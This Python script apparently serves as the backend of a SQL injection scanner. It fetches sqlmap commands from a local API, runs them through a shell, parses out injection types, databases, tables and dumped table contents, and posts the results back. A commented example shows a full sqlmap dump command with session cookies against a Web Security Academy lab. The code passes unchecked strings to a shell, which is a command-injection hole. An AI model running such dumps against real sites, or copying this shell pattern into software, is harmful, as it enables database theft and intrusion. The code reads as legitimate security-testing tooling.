import subprocess, requests, json
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings

#not
def scan_url_vulnerability(url):
	query = "sqlmap -u "+ url +" --batch"
	vuls=[]

	print(query)
	print("scanning vulnerability")
	process = subprocess.Popen([query],
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE, 
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout, stderr = process.communicate()

	for x in range(len(stdout)):
		#get_time_starting
		if (stdout[x:(x+8)])== "starting":
			time_starting = stdout[(x+11):(x+19)]
			f = open("output.txt", "w")
			f.write("time_starting:" + time_starting)
			f.write("\n")
			f.close()
		#get_vulnerability
		if (stdout[x:(x+4)]) == "Type":
			if stdout[x+6] == "b":
				vuls.append("B")
			elif stdout[x+6] == "s":
				vuls.append("S")
			elif stdout[x+6] == "t":
				vuls.append("T")
			else:
				vuls.append(stdout[x+6])
		#get_time_ending
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]

	f = open("output.txt", "a")
	for vul in vuls:
		f.write("vul:" + vul)
		f.write("\n")
	f.close()

	if len(vuls) == 0:
		f = open("output.txt", "a")
		f.write("time_ending:" + time_ending)
		f.close()
	
	return vuls		

#not
def scan_url_database(url, tech, level):
	query = "sqlmap -u " + url + " --technique=" + tech + " --level " + level + " --dbs" + " --batch"
	dbs = []

	print(query)
	print("scanning databases")
	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()
	

	for x in range(len(stdout)):
		if(stdout[x:(x+19)]) == "available databases":
			quantity_dbs = int(stdout[x+21])
			if(quantity_dbs == 1):
				for i in range((x+25), len(stdout), 1):
					if(stdout[i] == "\n"):
						dbs.append(stdout[(x+29):i])
						break
			else:
				getdb = 0
				i = x+19
				while(getdb < quantity_dbs):
					if(stdout[i] == "\n"):
						for j in range((i+6), len(stdout), 1):
							if(stdout[j] == "\n"):
								dbs.append(stdout[(i+5):j])
								break
						getdb += 1
						i += 1
					else:
						i += 1		

			if(len(dbs) == 0):
				f = open("output.txt", "a")
				f.write("dbs:null")
				f.write("\n")
				f.close()
			else:
				f = open("output.txt", "a")
				for db in dbs:
					f.write("dbs:" + db)
					f.write("\n")
				f.close()		
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]

	if len(dbs) == 0:
		f = open("output.txt", "a")
		f.write("time_ending:" + time_ending)
		f.close()

	return dbs

#not
def scan_url_tables(url, tech, level, db):
	query = "sqlmap -u " + url + " --technique=" + tech + " --level " + level + " -D " + db + " --tables" + " --batch"
	tables = []

	print(query)
	print("scanning tables")
	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()


	for x in range(len(stdout)):
		str_search = "Database: " + db
		if stdout[x:(x+10+len(db))] == str_search:
			quantity_tables = int(stdout[x+12+len(db)])
			get_tb = 0
			i = (x+12+len(db))
			while(get_tb < quantity_tables):
				if stdout[i] == "|":
					for j in range((i+1), len(stdout), 1):
						if stdout[j] == "|":
							get_tb += 1
							table = stdout[(i+1):(j-1)]
							tables.append(table)
							i += (len(table)+3)
							break
				else:
					i+=1
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]
			# print("time ending = " + time_ending)

	f = open("output.txt", "a")
	for i in range(len(tables)):
		print(tables[i].lstrip())
		f.write("table:" +tables[i].lstrip())
		f.write("\n")
	f.close()

	if len(tables) == 0:
		f = open("output.txt", "a")
		f.write("time_ending:" + time_ending)
		f.close()

	return tables

#not
def scan_url_dump(url, tech, level, db, table):
	query = "sqlmap -u " + url + " --technique=" + tech + " --level " + level + " -D " + db + " -T " + table + " --dump" +" --batch"

	print(query)
	print("scanning content")
	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()

	newspace = 0
	str_search = "Table: " + table
	for x in range(len(stdout)):
		if stdout[x:(x+7+len(table))] == str_search:
			for i in range(x, len(stdout),1):
				if stdout[i:(i+7)] == "entries":
					entries = int(stdout[(x+9+len(table)):(i-1)])
			for j in range(x, len(stdout), 1):
				if stdout[j] == "\n":
					newspace += 1
					if newspace == 2:
						start = j+1
					if newspace == (2+entries+1+3):
						end = j
						dump = stdout[start:end]
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]
			# print("time ending = " + time_ending)	

	f = open("output.txt", "a")
	f.write(stdout[start:end])
	f.write("\n")
	f.close()
	
	f = open("output.txt", "a")
	f.write("time_ending:" + time_ending)
	f.write("\n")
	f.close()

	return dump

#done
def scan_query_vulnerability(query):
	result = {}
	vuls = []

	print(query)
	print("scanning vulnerability")

	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout, stderr = process.communicate()
	
	for x in range(len(stdout)):
		#get_time_starting
		if (stdout[x:(x+8)])== "starting": 
			time_starting = stdout[(x+11):(x+19)]
			result["time_starting"] = time_starting
			# get_vulnerability
		if (stdout[x:(x+4)]) == "Type":
			if stdout[x+6] == "b":
				vuls.append("B")
			elif stdout[x+6] == "s":
				vuls.append("S")
			elif stdout[x+6] == "t":
				vuls.append("T")
			else:
				vuls.append(stdout[x+6])
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]

	result["vuls"] = vuls
	result["time_ending"] = time_ending		

	return result	

#done
def scan_query_database(query):
	result = {}
	dbs = []

	print(query)
	print("scanning database")

	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()

	for x in range(len(stdout)):
		if (stdout[x:(x+8)])== "starting": 
			time_starting = stdout[(x+11):(x+19)]			
		if(stdout[x:(x+19)]) == "available databases":
			quantity_dbs = int(stdout[x+21])
			if(quantity_dbs == 1):
				for i in range((x+25), len(stdout), 1):
					if(stdout[i] == "\n"):
						dbs.append(stdout[(x+29):i])
						break
			else:
				getdb = 0
				i = x+19
				while(getdb < quantity_dbs):
					if(stdout[i] == "\n"):
						for j in range((i+6), len(stdout), 1):
							if(stdout[j] == "\n"):
								dbs.append(stdout[(i+5):j])
								break
						getdb += 1
						i += 1
					else:
						i += 1		
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]

	result["time_starting"] = time_starting
	result["dbs"] = dbs
	result["time_ending"] = time_ending

	return result

#done
def scan_query_tables(query, db):

	result = {}
	db = db
	query = query
	tables = []

	print(query)
	print("scanning tables")

	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()

	for x in range(len(stdout)):
		if (stdout[x:(x+8)])== "starting": 
			time_starting = stdout[(x+11):(x+19)]
		str_search = "Database: " + db
		if stdout[x:(x+10+len(db))] == str_search:
			quantity_tables = int(stdout[x+12+len(db)])
			get_tb = 0
			i = (x+12+len(db))
			while(get_tb < quantity_tables):
				if stdout[i] == "|":
					for j in range((i+1), len(stdout), 1):
						if stdout[j] == "|":
							get_tb += 1
							table = stdout[(i+1):(j-1)]
							tables.append(table.lstrip())
							i += (len(table)+3)
							break
				else:
					i+=1
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]

	result["time_starting"] = time_starting
	result["tables"] = tables
	result["time_ending"] = time_ending

	return result

#done
def scan_query_dump(query, table):
	result = {}
	dump = ""
	table = table

	print(query)
	print("scanning dump")

	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()


	newspace = 0
	str_search = "Table: " + table
	for x in range(len(stdout)):
		if (stdout[x:(x+8)])== "starting": 
			time_starting = stdout[(x+11):(x+19)]
		if stdout[x:(x+7+len(table))] == str_search:
			for i in range(x, len(stdout),1):
				if stdout[i:(i+7)] == "entries":
					entries = int(stdout[(x+9+len(table)):(i-1)])
			for j in range(x, len(stdout), 1):
				if stdout[j] == "\n":
					newspace += 1
					if newspace == 2:
						start = j+1
					if newspace == (2+entries+1+3):
						end = j
						dump = stdout[start:end]
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]

	result["dump"] = dump
	result["time_starting"] = time_starting
	result["time_ending"] = time_ending

	return result

def main():
	HOST = "http://localhost:"
	PORT = "66580"

	try:
		disable_warnings(InsecureRequestWarning)
		API_GET = "/api/Scan"
		URL_GET = HOST + PORT + API_GET
		response = requests.get(url = URL_GET, verify = False)
		sqlmap = response.json()

		# sqlmap = {
		# 	"idCommand": 4,
		# 	"value": 'sqlmap -u https://0a3d007e04e78945c0807a9600c50039.web-security-academy.net/filter?category=Corporate+gifts --cookie="TrackingId=O5nmnO1IhFNkUeDY; session=BVB4nLXm3GjkOHJtBOpI2rJ39IJeYWIy" --level 2 --technique=B -D public -T users --dump --batch',
		# 	"db": "public",
		# 	"table": "users"
		# }
	except:
		print("Somthing wrong")
	else:
		query = sqlmap["value"]


		# idCommand = 1: scan vulnerability
		# idCommand = 2: scan databases
		# idCommand = 3: scan tables
		# idCommand = 4: scan dump
		if(sqlmap["idCommand"] == 1):
			# print("scan vulnerability")
			result = {}
			result = scan_query_vulnerability(query)
			print(len(result["vuls"]))
			if len(result["vuls"]) == 0:
				sqlmap["message"] = "The website has not sql injection vulnerability"
			else:
				sqlmap["message"] = "Scan success"
				sqlmap["vuls"] = result["vuls"]
				sqlmap["time_starting"] = result["time_starting"]
				sqlmap["time_ending"] = result["time_ending"]
		elif (sqlmap["idCommand"] == 2):
			# print("scan databases")
			result = {}
			result = scan_query_database(query)
			if len(result["dbs"]) == 0:
				sqlmap["message"] = "Not found database or the query wrong"
			else:
				sqlmap["message"] = "Scan success"
				sqlmap["dbs"] = result["dbs"]
				sqlmap["time_starting"] = result["time_starting"]
				sqlmap["time_ending"] = result["time_ending"]
		elif (sqlmap["idCommand"] == 3):
			# print("scan tables")
			result = {}
			db = sqlmap["db"]
			result = scan_query_tables(query, db)
			if len(result["tables"]) == 0:
				sqlmap["message"] = "Not found tables or the query wrong"
			else:
				sqlmap["message"] = "Scan success"
				sqlmap["tables"] = result["tables"]
				sqlmap["time_starting"] = result["time_starting"]
				sqlmap["time_ending"] = result["time_ending"]
		elif (sqlmap["idCommand"] == 4):
			# print("scan dump")
			result = {}
			table = sqlmap["table"]
			result = scan_query_dump(query, table)
			if len(result["dump"]) == 0:
				sqlmap["message"] = "Not found dump or the query wrong"
			else:
				sqlmap["message"] = "Scan success"
				sqlmap["dump"] = result["dump"]
				sqlmap["time_starting"] = result["time_starting"]
				sqlmap["time_ending"] = result["time_ending"]
	
		API_POST = "/api/Scan"
		URL_POST = HOST + PORT + API_POST
		headers={
    		'Content-type':'application/json', 
   			'Accept':'application/json'
		}
		request = requests.post(url = URL_POST, json = sqlmap, headers = headers, verify = False)
		# print(request.text)

		# print(sqlmap)
		
if __name__ == "__main__":
	main()